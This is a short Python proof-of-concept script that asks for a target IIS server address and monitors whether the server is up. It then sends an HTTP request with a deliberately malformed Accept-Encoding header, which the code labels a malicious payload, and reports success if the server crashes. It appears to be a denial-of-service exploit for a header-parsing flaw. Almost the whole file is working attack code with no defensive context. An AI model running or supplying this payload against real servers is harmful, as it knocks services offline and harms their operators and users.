import argparse
import datetime
import requests
import time
import threading

class colors:
    succ = '\033[92m' #GREEN
    warning = '\033[93m' #YELLOW
    failed = '\033[91m' #RED
    reset = '\033[0m' #RESET COLOR


def job(addr):
    for i  in range(5):
        try:
            r = requests.get(addr, timeout=3)
        except Exception as e:
            print(colors.warning + 'The IIS target server is disconnected!' + colors.reset)
        else:
            print(colors.succ + 'The IIS target server is running!' + colors.reset)
        
        time.sleep(1)


if __name__ == '__main__':
    # get the IP address of IIS server
    #parser = argparse.ArgumentParser(description='Get the target IIS server')
    #parser.add_argument('-t', '--target', default=None, help='IIS server IP address')

    # args = parser.parse_args()
    # address = args.target
    address = input('Please enter the IP address of target IIS server: ')
    
    if 'http' not in address:
        address = 'http://' + address
    elif 'https' in address:
        address.replace('https', 'http')

    # continuously monitor IIS server condition
    print('start to monitor IIS server...')
    t = threading.Thread(target=job, args=(address, ))

    t.start()
    # let the monitoring keep going for a while
    time.sleep(2)

    # start to send malicious payload
    print('***************************** Start PoC ******************************')
    headers = {
        'Accept-Encoding': 'AAAAAAAAABLACKInYourArea, '
                            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&AA&**AAAAAAAAAAAAAAAAAAAA**A, '
                            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOhOhStupidServer, '
                            'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHaHaHaIAmMalicious, '
                            'BotingIsSoFatCassieIsSoSlim, '
                            '****************************AAAAAA, *, ,'
    }     

    try:
        r = requests.get(address, headers=headers, timeout=16)
    except Exception as e:
        # after all monitoring thread is over
        t.join()
        # target is down
        print(colors.failed + 'The IIS target server is crashed! PoC succeed!' + colors.reset)

    t.join()
